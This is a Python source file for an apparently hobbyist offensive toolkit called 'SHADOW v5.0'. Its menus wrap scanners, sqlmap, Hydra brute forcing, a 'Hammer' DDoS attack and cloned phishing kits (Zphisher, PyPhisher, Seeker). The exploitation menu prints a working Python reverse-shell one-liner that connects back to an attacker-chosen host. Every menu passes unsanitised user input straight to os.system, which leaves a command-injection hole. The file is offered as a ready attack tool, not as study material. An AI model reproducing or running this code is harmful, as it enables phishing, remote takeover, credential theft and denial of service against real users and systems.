import os
import sys
import time
import subprocess
import datetime
from colorama import Fore, Style

# কালার সেটিংস
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
B = Fore.BLUE
W = Style.RESET_ALL

# গ্লোবাল ভেরিয়েবল
LOG_FILE = "shadow_logs.txt"

def banner():
    os.system('clear')
    print(f"""{R}
    ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
    ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
    ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
    ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
               {G}[ SHADOW v5.0 - THE ULTIMATE FRAMEWORK ]{W}
    {Y}-------------------------------------------------------{W}
    {C}  Log File: {LOG_FILE} | Status: Online | Version: 5.0 {W}
    {Y}-------------------------------------------------------{W}
    """)

def write_log(message):
    with open(LOG_FILE, "a") as f:
        now = datetime.datetime.now()
        f.write(f"[{now}] {message}\n")

def run_cmd(cmd):
    print(f"\n{G}[*] Status: Running Command...{W}")
    print(f"{C}[#] Shell: {cmd}{W}\n")
    try:
        write_log(f"Executed: {cmd}")
        os.system(cmd)
    except Exception as e:
        print(f"{R}[!] Critical Error: {e}{W}")
    
    print(f"\n{Y}-------------------------------------------------------{W}")
    input(f"{G}[+] Press Enter to return to menu...{W}")

# --- ১. ইনফরমেশন গ্যাদারিং ---
def info_gathering():
    while True:
        banner()
        print(f"{C}১. Nmap (Network Scanner)")
        print(f"২. Whois (Domain Info)")
        print(f"৩. IP-Tracer (Geo Location)")
        print(f"৪. DNS Lookup (Host Record)")
        print(f"০. Back{W}")
        ch = input(f"\n{G}Shadow(Info) > {W}")
        if ch == '1':
            ip = input(f"{Y}Target IP/URL: {W}")
            run_cmd(f"nmap -A -T4 {ip}")
        elif ch == '2':
            dom = input(f"{Y}Domain Name: {W}")
            run_cmd(f"whois {dom}")
        elif ch == '3':
            ip = input(f"{Y}IP Address: {W}")
            run_cmd(f"curl http://ip-api.com/line/{ip}")
        elif ch == '4':
            dom = input(f"{Y}Domain: {W}")
            run_cmd(f"nslookup {dom}")
        elif ch == '0': break

# --- ২. ওয়েব অ্যাটাক ---
def web_attack():
    while True:
        banner()
        print(f"{C}১. Nikto (Vuln Scan)\n২. SQLMap (DB Attack)\n৩. Nuclei (Advanced Template)\n৪. Dirb (Directory Buster)\n০. Back{W}")
        ch = input(f"\n{G}Shadow(Web) > {W}")
        if ch == '1':
            url = input(f"{Y}URL: {W}")
            run_cmd(f"nikto -h {url}")
        elif ch == '2':
            url = input(f"{Y}Vulnerable URL: {W}")
            run_cmd(f"sqlmap -u {url} --batch --random-agent")
        elif ch == '3':
            url = input(f"{Y}URL: {W}")
            run_cmd(f"nuclei -u {url}")
        elif ch == '4':
            url = input(f"{Y}URL: {W}")
            run_cmd(f"dirb {url}")
        elif ch == '0': break

# --- ৩. ফিশিং সেকশন ---
def phishing():
    while True:
        banner()
        print(f"{C}১. Zphisher (Social Media)\n২. PyPhisher (Advance Phishing)\n৩. Seeker (Location Phish)\n০. Back{W}")
        ch = input(f"\n{G}Shadow(Phish) > {W}")
        if ch == '1':
            if not os.path.exists("zphisher"):
                os.system("git clone --depth=1 https://github.com/htr-tech/zphisher.git")
            os.system("cd zphisher && bash zphisher.sh")
        elif ch == '2':
            if not os.path.exists("PyPhisher"):
                os.system("git clone https://github.com/KasRoudra/PyPhisher.git")
            os.system("cd PyPhisher && python3 pyphisher.py")
        elif ch == '3':
            if not os.path.exists("seeker"):
                os.system("git clone https://github.com/thewhiteh4t/seeker.git")
            os.system("cd seeker && python3 seeker.py")
        elif ch == '0': break

# --- ৪. পেলোড ও এক্সপ্লয়েট ---
def exploitation():
    while True:
        banner()
        print(f"{C}১. MetaSploit Setup (Termux)\n২. Reverse Shell Generator\n৩. Routersploit\n০. Back{W}")
        ch = input(f"\n{G}Shadow(Exploit) > {W}")
        if ch == '1':
            run_cmd("pkg install metasploit -y")
        elif ch == '2':
            ip = input("Your LHOST: ")
            port = input("Your LPORT: ")
            print(f"{Y}Python Shell: {W}python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
            input("\nCopy shell and press Enter...")
        elif ch == '0': break

# --- ৫. সোশ্যাল হান্টার ---
def social_hunter():
    banner()
    user = input(f"\n{G}Search Username: {W}")
    if not os.path.exists("sherlock"):
        os.system("git clone https://github.com/sherlock-project/sherlock.git")
        os.system("pip install -r sherlock/requirements.txt")
    run_cmd(f"python3 sherlock/sherlock/sherlock.py {user}")

# --- ৬. পাসওয়ার্ড ও ডিডস ---
def password_and_ddos():
    while True:
        banner()
        print(f"{C}১. Hydra (Brute Force)\n২. Cupp (Wordlist Gen)\n৩. Hammer (DDoS Attack)\n০. Back{W}")
        ch = input(f"\n{G}Shadow(Extra) > {W}")
        if ch == '1':
            cmd = input("Full Hydra Command: ")
            run_cmd(cmd)
        elif ch == '2':
            if not os.path.exists("cupp"): os.system("git clone https://github.com/Mebus/cupp.git")
            run_cmd("python3 cupp/cupp.py -i")
        elif ch == '3':
            ip = input("Target IP: ")
            run_cmd(f"python3 hammer.py -s {ip}")
        elif ch == '0': break

# --- মেইন মেনু ---
def main():
    while True:
        banner()
        print(f"{Y}১. Information Gathering   ২. Web Attack Vulnerability")
        print("৩. Phishing Attacks        ৪. Exploitation & Payload")
        print("৫. Sherlock Social Hunter  ৬. Password & DDoS")
        print(f"৭. Update Shadow Tool      ৮. View Tool Logs\n০. Exit{W}")
        
        choice = input(f"\n{G}Shadow(Main) > {W}")

        if choice == '1': info_gathering()
        elif choice == '2': web_attack()
        elif choice == '3': phishing()
        elif choice == '4': exploitation()
        elif choice == '5': social_hunter()
        elif choice == '6': password_and_ddos()
        elif choice == '7': 
            os.system("git pull")
            print(f"{G}Updated!{W}"); time.sleep(1)
        elif choice == '8':
            run_cmd(f"cat {LOG_FILE}")
        elif choice == '0':
            sys.exit()
        else:
            print(f"{R}Invalid!{W}"); time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
